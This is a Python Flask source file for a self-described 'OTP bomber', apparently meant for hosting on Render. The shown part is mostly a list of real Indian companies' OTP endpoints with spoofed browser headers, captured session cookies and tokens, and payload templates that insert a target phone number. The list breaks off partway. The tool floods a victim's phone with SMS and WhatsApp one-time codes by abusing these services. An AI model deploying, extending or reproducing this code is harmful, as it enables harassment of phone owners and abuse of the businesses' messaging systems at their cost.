# 𝗣𝗥𝗢𝗝𝗘𝗖𝗧 𝗙𝗢𝗥 𝗙𝗥𝗘𝗘 𝗢𝗧𝗣 𝗕𝗢𝗠𝗕𝗘𝗥 𝗨𝗦𝗜𝗡𝗚 𝗥𝗘𝗡𝗗𝗘𝗥. 𝗖𝗢𝗠 𝗙𝗥𝗘𝗘 𝗔𝗣𝗜 𝗠𝗔𝗞𝗜𝗡𝗚 🌹🌹
# 𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 @𝗣𝗥𝗢𝗩𝗜𝗗𝗘𝗥𝗕𝗢𝗧𝗭 🇮🇳

# -*- coding: utf-8 -*-

import asyncio
import aiohttp
import json
import random
import time
import re
import threading
import os
from typing import Dict, List, Optional, Union, Callable
from flask import Flask, request, jsonify, Response
from concurrent.futures import ThreadPoolExecutor
import logging

# ==================================================================
# ðŸ“± CONFIGURATION
# ==================================================================
app = Flask(__name__)

# Disable Flask debug logs in production
if os.environ.get('RENDER', False):
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)

# ==================================================================
# ðŸ“± PHONE NUMBER VALIDATION
# ==================================================================
def validate_phone(phone: str) -> tuple:
    """Validate and clean phone number, return (country_code, clean_number)"""
    phone = re.sub(r'[^\d+]', '', phone.strip())
    if phone.startswith('+'):
        if phone.startswith('+91'):
            return '91', phone[3:]
    elif phone.startswith('91'):
        return '91', phone[2:]
    elif len(phone) == 10:
        return '91', phone
    elif len(phone) == 12 and phone.isdigit():
        return '91', phone[2:]
    return None, None

# ==================================================================
# ðŸ”¥ COMPLETE API DATABASE - ALL APIS COMBINED
# ==================================================================
def get_all_apis():
    """Return ALL APIs combined from your files - A to Z"""
    
    # ==================================================================
    # SECTION 1: API_CONFIGS (from your first file - full list)
    # ==================================================================
    api_configs = [
        {
            "name": "Lenskart SMS",
            "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "Accept": "*/*",
                "X-API-Client": "mobilesite",
                "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a",
                "X-Accept-Language": "en",
                "X-B3-TraceId": "991736185845136",
                "X-Country-Code": "IN",
                "X-Country-Code-Override": "IN",
                "Sec-CH-UA-Platform": '"Android"',
                "Sec-CH-UA": '"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                "Sec-CH-UA-Mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                "Origin": "https://www.lenskart.com",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.lenskart.com/",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
            },
            "data": lambda p: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}'
        },
        {
            "name": "GoPink Cabs SMS",
            "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
            "method": "POST",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept": "*/*",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://www.gopinkcabs.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.gopinkcabs.com/app/cab/customer/step1.php",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                "Sec-CH-UA-Platform": '"Android"',
                "Sec-CH-UA": '"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                "Sec-CH-UA-Mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                "Cookie": "PHPSESSID=mor5basshemi72pl6d0bp21kso; mylocation=#"
            },
            "data": lambda p: f"check_mobile_number=1&contact={p}"
        },
        {
            "name": "Shemaroome SMS",
            "url": "https://www.shemaroome.com/users/resend_otp",
            "method": "POST",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept": "*/*",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://www.shemaroome.com",
                "Referer": "https://www.shemaroome.com/users/sign_in",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
            },
            "data": lambda p: f"mobile_no=%2B91{p}"
        },
        {
            "name": "KPN Fresh WEB",
            "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
            "method": "POST",
            "headers": {
                "sec-ch-ua-platform": '"Android"',
                "cache": "no-store",
                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                "x-channel-id": "WEB",
                "sec-ch-ua-mobile": "?1",
                "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "content-type": "application/json",
                "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
                "accept": "*/*",
                "origin": "https://www.kpnfresh.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.kpnfresh.com/",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "priority": "u=1, i"
            },
            "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'
        },
        {
            "name": "KPN Fresh WhatsApp",
            "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
            "method": "POST",
            "headers": {
                "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
                "x-app-version": "3.2.6",
                "x-user-journey-id": "faf3393a-018e-4fb9-8aed-8c9a90300b88",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.11"
            },
            "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'
        },
        {
            "name": "BikeFixup SMS",
            "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
            "method": "POST",
            "headers": {
                "accept": "application/json",
                "accept-encoding": "gzip",
                "host": "api.bikefixup.com",
                "client": "app",
                "content-type": "application/json; charset=UTF-8",
                "user-agent": "Dart/3.6 (dart:io)"
            },
            "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'
        },
        {
            "name": "Rappi WhatsApp",
            "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
            "method": "POST",
            "headers": {
                "Deviceid": "5df83c463f0ff8ff",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/QP1A.190711.020)",
                "Accept-Language": "en-US",
                "Accept": "application/json",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip, deflate"
            },
            "data": lambda p: f'{{"phone":"{p}","country_code":"+91"}}'
        },
        {
            "name": "Stratzy Phone OTP",
            "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
            "method": "POST",
            "headers": {
                "sec-ch-ua-platform": '"Android"',
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                "content-type": "application/json",
                "sec-ch-ua-mobile": "?1",
                "accept": "*/*",
                "origin": "https://stratzy.in",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://stratzy.in/login",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "cookie": "_fbp=fb.1.1745073074472.847987893655824745; _ga=GA1.1.2022915250.1745073078; _ga_TDMEH7B1D5=GS1.1.1745073077.1.1.1745073132.5.0.0",
                "priority": "u=1, i"
            },
            "data": lambda p: f'{{"phoneNo":"{p}"}}'
        },
        {
            "name": "Stratzy WhatsApp",
            "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
            "method": "POST",
            "headers": {
                "sec-ch-ua-platform": '"Android"',
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                "content-type": "application/json",
                "sec-ch-ua-mobile": "?1",
                "accept": "*/*",
                "origin": "https://stratzy.in",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://stratzy.in/login",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "cookie": "_fbp=fb.1.1745073074472.847987893655824745; _ga=GA1.1.2022915250.1745073078; _ga_TDMEH7B1D5=GS1.1.1745073077.1.1.1745073102.35.0.0",
                "priority": "u=1, i"
            },
            "data": lambda p: f'{{"phoneNo":"{p}"}}'
        },
        {
            "name": "WellAcademy SMS",
            "url": "https://wellacademy.in/store/api/numberLoginV2",
            "method": "POST",
            "headers": {
                "sec-ch-ua-platform": '"Android"',
                "x-requested-with": "XMLHttpRequest",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "accept": "application/json, text/javascript, */*; q=0.01",
                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                "content-type": "application/json; charset=UTF-8",
                "sec-ch-ua-mobile": "?1",
                "origin": "https://wellacademy.in",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://wellacademy.in/store/",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "cookie": "ci_session=9phtdg2os6f19dae6u8hkf3fnfthcu8e; _ga=GA1.1.229652925.1745073317; _ga_YCZKX9HKYC=GS1.1.1745073316.1.1.1745073316.0.0.0; _clck=rhb9ip%7C2%7Cfv7%7C0%7C1935; _clsk=kfjbpg%7C1745073319962%7C1%7C1%7Ch.clarity.ms%2Fcollect; cf_clearance=...; twk_idm_key=PjxT2Q-2-xzG4VIHJXn7V; twk_uuid_5f588625f0e7167d000eb093=%7B...%7D; TawkConnectionTime=0",
                "priority": "u=1, i"
            },
            "data": lambda p: f'{{"contact_no":"{p}"}}'
        },
        {
            "name": "Hungama OTP",
            "url": "https://communication.api.hungama.com/v1/communication/otp",
            "method": "POST",
            "headers": {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "identifier": "home",
                "mlang": "en",
                "sec-ch-ua-platform": '"Android"',
                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                "sec-ch-ua-mobile": "?1",
                "alang": "en",
                "country_code": "IN",
                "vlang": "en",
                "origin": "https://www.hungama.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.hungama.com/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
            },
            "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","emailId":"","subject":"Register","priority":"1","device":"web","variant":"v1","templateCode":1}}'
        },
        {
            "name": "ServeTel SMS",
            "url": "https://api.servetel.in/v1/auth/otp",
            "method": "POST",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
                "Host": "api.servetel.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            },
            "data": lambda p: f"mobile_number={p}"
        },
        {
            "name": "Meru Cab SMS",
            "url": "https://merucabapp.com/api/otp/generate",
            "method": "POST",
            "headers": {
                "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
                "Oauthtoken": "",
                "AppVersion": "245",
                "ApiVersion": "6.2.55",
                "DeviceType": "Android",
                "DeviceId": "44098bdebb2dc047",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "24",
                "Host": "merucabapp.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.9.0"
            },
            "data": lambda p: f"mobile_number={p}"
        },
        {
            "name": "BeepKart SMS",
            "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
            "method": "POST",
            "headers": {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "sec-ch-ua-platform": '"Android"',
                "changesorigin": "product-listingpage",
                "originid": "0",
                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                "sec-ch-ua-mobile": "?1",
                "appname": "Website",
                "userid": "0",
                "origin": "https://www.beepkart.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.beepkart.com/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
            },
            "data": lambda p: f'{{"city":362,"fullName":"","phone":"{p}","source":"myaccount","location":"","leadSourceLang":"","platform":"","consent":false,"whatsappConsent":false,"blockNotification":false,"utmSource":"","utmCampaign":"","sessionInfo":{{"sessionInfo":{{"sessionId":"d25b5a3d-72b4-4cd7-b6cb-b926a70ca08b","userId":"0","sessionRawString":"pathname=/account/new-landing&source=myaccount","referrerUrl":"/app_login?pathname=/account/new-landing&source=myaccount"}},"deviceInfo":{{"deviceRawString":"cityId=362; screen=360x800; _gcl_au=1.1.771171092.1745234524; cityName=bangalore","device_token":"PjwHFhDUVgUGYrkW29b5lGdR0kTg4kaA","device_type":"Android"}}}}'
        },
        {
            "name": "LendingPlate SMS",
            "url": "https://lendingplate.com/api.php",
            "method": "POST",
            "headers": {
                "Host": "lendingplate.com",
                "Connection": "keep-alive",
                "Content-Length": "45",
                "sec-ch-ua-platform": '"Android"',
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua-mobile": "?1",
                "Origin": "https://lendingplate.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://lendingplate.com/personal-loan",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "Cookie": "_fbp=fb.1.1745235455885.251422456376518259; _gcl_au=1.1.241418330.1745235457; _gid=GA1.2.593762244.1745235461; PHPSESSID=ed051a5ea7783741eacfd602c6a192d3; _ga=GA1.1.1324264906.1745235460; _ga_MZBRRWYESB=GS1.1.1745235460.1.1.1745235474.46.0.0; moe_uuid=370f7dae-9313-4d44-8e38-efe54c437df8; _ga_KVRZ90DE3T=GS1.1.1745235460.1.1.1745235496.24.0.0"
            },
            "data": lambda p: f"mobiles={p}&resend=Resend&clickcount=3"
        },
        {
            "name": "Snitch SMS",
            "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
            "method": "POST",
            "headers": {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "sec-ch-ua-platform": '"Android"',
                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                "sec-ch-ua-mobile": "?1",
                "client-id": "snitch_secret",
                "Accept-Headers": "application/json",
                "Origin": "https://www.snitch.com",
                "Sec-Fetch-Site": "cross-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.snitch.com/",
                "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
            },
            "data": lambda p: f'{{"mobile_number":"+91{p}"}}'
        },
        {
            "name": "Dayco India SMS",
            "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
            "method": "POST",
            "headers": {
                "Content-Length": "61",
                "sec-ch-ua-platform": '"Android"',
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua-mobile": "?1",
                "Origin": "https://ekyc.daycoindia.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "Cookie": "_ga_E8YSD34SG2=GS1.1.1745236629.1.0.1745236629.60.0.0; _ga=GA1.1.1156483287.1745236629; _clck=hy49vg%7C2%7Cfv9%7C0%7C1937; PHPSESSID=tbt45qc065ng0cotka6aql88sm; _clsk=1oia3yt%7C1745236688928%7C3%7C1%7Cu.clarity.ms%2Fcollect",
                "Priority": "u=1, i"
            },
            "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"
        },
        {
            "name": "PenPencil SMS",
            "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
            "method": "POST",
            "headers": {
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1"
            },
            "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'
        },
        {
            "name": "Otpless SMS",
            "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
            "method": "POST",
            "headers": {
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "sec-ch-ua-platform": "Android",
                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                "sec-ch-ua-mobile": "?1",
                "origin": "https://otpless.com",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://otpless.com/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
            },
            "data": lambda p: f'{{"loginUri":"https://otpless.com/appid/0BMO1A04TAKEKDFR46DA?sdkPlatform=SHOPIFY&redirect_uri=https://imagineonline.store/account/login","origin":"https://otpless.com","deviceInfo":"{{\\"userAgent\\":\\"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36\\",\\"platform\\":\\"Linux armv81\\",\\"vendor\\":\\"Google Inc.\\",\\"browser\\":\\"Chrome\\",\\"connection\\":\\"4g\\",\\"language\\":\\"en-IN\\",\\"cookieEnabled\\":true,\\"screenWidth\\":360,\\"screenHeight\\":800,\\"screenColorDepth\\":24,\\"devicePixelRatio\\":3,\\"timezoneOffset\\":-330,\\"cpuArchitecture\\":\\"8-core\\",\\"fontFamily\\":\\"\\\\\\"Times New Roman\\\\\\"\\",\\"cHash\\":\\"82c029dd209dc895ed5cdbe212c5d67a50d3aadc918ecd24a3d06744b2e8e1f1\\"}}","browser":"Chrome","sdkPlatform":"SHOPIFY","platform":"Android","isLoginPage":true,"fingerprintJs":"{{\\"visitorId\\":\\"3bd3e9c36b55052f8c6aa470a1b7f1f7\\",\\"version\\":\\"4.6.1\\",\\"confidence\\":{{\\"score\\":0.4,\\"comment\\":\\"0.994 if upgrade to Pro: https://fpjs.dev/pro\\"}}}}","channel":"OTP","silentAuthEnabled":false,"triggerWebauthn":true,"mobile":"{p}","value":"7029364131","selectedCountryCode":"+91","recaptchaToken":"YourRecaptchaTokenHere"}}'
        },
        {
            "name": "MyImagineStore SMS",
            "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
            "method": "POST",
            "headers": {
                "sec-ch-ua-platform": "Android",
                "viewport-width": "360",
                "ect": "4g",
                "device-memory": "8",
                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                "sec-ch-ua-mobile": "?1",
                "dpr": "3",
                "x-requested-with": "XMLHttpRequest",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.myimaginestore.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.myimaginestore.com/?srsltid=AfmBOorMjDyyPK614cwQ_BYW58QCQwqGy2z3CU1dNnWF-NnvMwFcpOgA",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "Cookie": "PHPSESSID=8trla61rg1ong40jfipnbkgbo2; searchReport-log=0; n7HDToken=d+IZAKbE68OGf8+MM3jp90Mh6Q7BsnSBnMQErzL+ViPGD2mROvGr8S/f/qo7gEEdKNx/7TbxOIKo/VLu3jyj1plDFiAxE5Gc3j24XaWSb7MUbgXOEq+MYK8gnkV3fuQb9nQEzNtrCfWu17tUGSJnbWaPF4OVHNTvPbpwT5KFt1Y=; _fbp=fb.1.1745237999949.310699470488280662; _gcl_au=1.1.1379491012.1745238000; form_key=BGrEvqqhl0ydIR8q; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; _ga=GA1.2.1310867166.1745238001; _gid=GA1.2.1539797096.1745238002; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; twk_idm_key=2gFbbj1GW6XCnip5ilOxx; TawkConnectionTime=0; _ga_GQ7J3T0PJB=GS1.1.1745238000.1.1.1745238019.41.0.0; private_content_version=e5dc03e8bc555ce39375a87c1f3e5089; section_data_ids=%7B%22cart%22%3A1745238010%2C%22customer%22%3A1745238010%2C%22compare-products%22%3A1745238010%2C%22last-ordered-items%22%3A1745238010%2C%22directory-data%22%3A1745238010%2C%22captcha%22%3A1745238010%2C%22instant-purchase%22%3A1745238010%2C%22loggedAsCustomer%22%3A1745238010%2C%22persistent%22%3A1745238010%2C%22review%22%3A1745238010%2C%22wishlist%22%3A1745238010%2C%22ammessages%22%3A1745238010%2C%22bss-fbpixel-atc%22%3A1745238010%2C%22bss-fbpixel-subscribe%22%3A1745238010%2C%22chatData%22%3A1745238010%2C%22recently_viewed_product%22%3A1745238010%2C%22recently_compared_product%22%3A1745238010%2C%22product_data_storage%22%3A1745238010%7D"
            },
            "data": lambda p: f"mobile={p}"
        },
        {
            "name": "NoBroker SMS",
            "url": "https://www.nobroker.in/api/v3/account/otp/send",
            "method": "POST",
            "headers": {
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/x-www-form-urlencoded",
                "sec-ch-ua-platform": "Android",
                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                "sec-ch-ua-mobile": "?1",
                "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=2a1cf434a30d4d3189d50a0751921996",
                "sentry-trace": "2a1cf434a30d4d3189d50a0751921996-9a2517ad5ff86454",
                "origin": "https://www.nobroker.in",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.nobroker.in/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Cookie": "cloudfront-viewer-address=2001%3A4860%3A7%3A508%3A%3Aef%3A33486; cloudfront-viewer-country=MY; cloudfront-viewer-latitude=2.50000; cloudfront-viewer-longitude=112.50000; headerFalse=false; isMobile=true; deviceType=android; js_enabled=true; nbcr=bangalore; nbpt=RENT; nbSource=www.google.com; nbMedium=organic; nbCampaign=https%3A%2F%2Fwww.google.com%2F; nb_swagger=%7B%22app_install_banner%22%3A%22bannerB%22%7D; _gcl_au=1.1.1907920311.1745238224; _gid=GA1.2.1607866815.1745238224; _ga=GA1.2.777875435.1745238224; nbAppBanner=close; cto_bundle=jK9TOl9FUzhIa2t2MUElMkIzSW1pJTJCVnBOMXJyNkRSSTlkRzZvQUU0MEpzRXdEbU5ySkI0NkJOZmUlMkZyZUtmcjU5d214YkpCMTZQdTJDb1I2cWVEN2FnbWhIbU9oY09xYnVtc2VhV2J0JTJCWiUyQjl2clpMRGpQaVFoRWREUzdyejJTdlZKOEhFZ2Zmb2JXRFRyakJQVmRNaFp2OG5YVHFnJTNEJTNE; _fbp=fb.1.1745238225639.985270044964203739; moe_uuid=901076a7-33b8-42a8-a897-2ef3cde39273; _ga_BS11V183V6=GS1.1.1745238224.1.1.1745238241.0.0.0; _ga_STLR7BLZQN=GS1.1.1745238224.1.1.1745238241.0.0.0; mbTrackID=b9cc4f8434124733b01c392af03e9a51; nbDevice=mobile; nbccc=21c801923a9a4d239d7a05bc58fcbc57; JSESSION=5056e202-0da2-4ce9-8789-d4fe791a551c; _gat_UA-46762303-1=1; _ga_SQ9H8YK20V=GS1.1.1745238224.1.1.1745238326.18.0.1658024385"
            },
            "data": lambda p: f"phone={p}&countryCode=IN"
        },
        {
            "name": "Cossouq SMS",
            "url": "https://www.cossouq.com/mobilelogin/otp/send",
            "method": "POST",
            "headers": {
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/x-www-form-urlencoded",
                "sec-ch-ua-platform": "Android",
                "x-requested-with": "XMLHttpRequest",
                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                "sec-ch-ua-mobile": "?1",
                "origin": "https://www.cossouq.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.cossouq.com/?srsltid=AfmBOoqQ0GRbpH-mXrUJ5b6tAC5W6ZyAzFJRI7l0mbnNQ9i5LMpAIvh1",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
